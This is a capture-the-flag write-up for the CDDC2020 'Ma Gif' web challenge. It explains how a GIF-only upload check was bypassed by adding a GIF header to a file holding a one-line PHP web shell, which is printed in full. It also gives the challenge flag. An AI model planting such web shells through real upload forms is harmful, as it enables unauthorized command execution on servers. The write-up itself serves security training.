# Ma Gif

## Description 

Well apparently, the CTO of Unduplicitous Corp love, love, LOVE GIFs! ;)
http://magifs.chall.cddc2020.nshc.sg:13373/

## Solution

When entering clicking on the website link given, a webpage prompting user to upload a gif file. After some searching, it shows that this webpage is vulnerable to Unrestricted File Upload Bypass.
Since the webpage checks for gif file before uploading the file to the server, the header of the file containing the payload of a php syntax to execute command injection was changed to a gif file header. 
```
php payload: <?php system($_GET['cmd']); ?>
```

<br>
Once the file is uploaded, commands are issued to locate the file of the flag and retrieve the flag. 
![flag](https://github.com/mashmllo/CDDC2020-Writeup/blob/master/Web/Ma%20Gif/flag_gif.jpg)

## Flag 
CDDC20{w0W_u_hAz_FlaG!!h3he}
